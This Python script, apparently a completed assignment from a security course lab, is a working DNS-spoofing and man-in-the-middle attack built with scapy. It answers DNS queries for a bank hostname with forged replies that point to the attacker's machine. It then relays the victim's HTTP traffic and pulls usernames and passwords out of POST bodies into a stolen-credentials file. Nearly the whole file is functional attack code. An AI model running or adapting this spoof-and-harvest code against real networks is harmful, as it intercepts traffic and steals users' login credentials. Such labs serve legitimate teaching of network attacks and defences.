import os
import argparse
import socket
from scapy.all import *
conf.L3socket = L3RawSocket
WEB_PORT = 8888
DNS_PORT = 53
MAX_BUFFER = 50000
HOSTNAME = "LetumiBank.com"

def resolve_hostname(hostname):
	# IP address of HOSTNAME. Used to forward tcp connection.
	# Normally obtained via DNS lookup.
	return "127.1.1.1"
def log_credentials(username, password):
	# Write stolen credentials out to file.
	# Do not change this.
	with open("lib/StolenCreds.txt", "wb") as fd:
		fd.write(str.encode("Stolen credentials: username=" + username + " password=" + password))
def check_credentials(client_data):
	message = str(client_data)
	if "username=" in message and "password=" in message:
		headers, body = message.split("\r\n\r\n", 1)
		if "username=" in body and "password=" in body:
			# body.split('&') gives list of things between &'s. split(=) gives list of two by assumption before = and after.
			# but we need to look only for the ones that have '='.
			params = {left: right for left, right in (param.split('=') for param in body.split('&') if '=' in param)}
			username = params["username"]
			password = params["password"]
			log_credentials(username, password)
def handle_tcp_forwarding(client_socket, client_ip, hostname):
	# Continuously intercept new connections from the client
	# and initiate a connection with the host in order to forward data
	while True:
		# accepts a new connection from the client on client_socket and
		#----------------------------------------------------------------------------
		client, _ = client_socket.accept()
		#----------------------------------------------------------------------------
		# reads data from client socket, checks for credentials, and forwards along to host socket.
		#-----------------------------------------------------------------------------------------
		packet = client.recv(MAX_BUFFER)
		packet_after_decode = packet.decode()
		check_credentials(packet_after_decode)
		#----------------------------------------------------------------------------
		# creates a new socket to connect to the actual host associated with hostname.
		#----------------------------------------------------------------------------
		socket_for_host = socket.socket() 
		host_address = resolve_hostname(hostname)
		socket_for_host.connect((host_address, WEB_PORT))
		socket_for_host.send(packet)
		the_response = socket_for_host.recv(MAX_BUFFER)
		client.send(the_response)
		client.close()
		#-----------------------------------------------------------------------------
		# Checks for POST to '/post_logout' and exits after that request has completed.
		#-----------------------------------------------------------------------------
		if "POST /post_logout" in packet_after_decode:
			exit()
def dns_callback(packet, extra_args):
	# callback function for handling DNS packets.
	if packet.haslayer(DNS):
		ip_entry, udp_entry, dns_entry, qr_entry = packet[IP], packet[UDP], packet[DNS], packet[DNSQR]
		query_name = str(qr_entry.qname)
		# Sends a spoofed DNS response for a query to HOSTNAME and
		if HOSTNAME in query_name:
			answer = DNSRR(rrname = HOSTNAME, rdata = extra_args[1])
			response = IP(dst = ip_entry.src, src = ip_entry.dst) / UDP(dport = udp_entry.sport, sport = udp_entry.dport) /DNS(id = dns_entry.id, qd = qr_entry, qr = 1, aa = 1, an = answer)
			send(response, iface="lo")
			# callshandle_tcp_forwarding() after successful spoof.
			handle_tcp_forwarding(extra_args[0], extra_args[1], HOSTNAME)
def sniff_and_spoof(source_ip):
	#-----------------------------------------------------------------------
	# Opens a socket and binds it to the attacker's IP and WEB_PORT.
	# This socket will be used to accept connections from victimized clients
	#-----------------------------------------------------------------------
	new_socket = socket.socket()
	new_socket.bind((source_ip, WEB_PORT))
	new_socket.listen()
	#-------------------------------------------------------------------
	# sniffs for DNS packets on the network. Makes sure to pass source_ip
	# and the socket you created as extra callback arguments.
	#-------------------------------------------------------------------
	sniff(iface="lo",
	   filter=f"port {DNS_PORT}",
	   prn=lambda dns_packet: dns_callback(dns_packet, (new_socket, source_ip)))
def main():
	parser = argparse.ArgumentParser(description='Attacker who spoofs dns packet and hijacks connection')
	parser.add_argument('--source_ip', nargs='?', const=1, default="127.0.0.3", help='ip of the attacker')
	args = parser.parse_args()
	sniff_and_spoof(args.source_ip)
if __name__ == "__main__":
	# Change working directory to script's dir.
	# Do not change this.
	abspath = os.path.abspath(__file__)
	dirname = os.path.dirname(abspath)
	os.chdir(dirname)
	main()
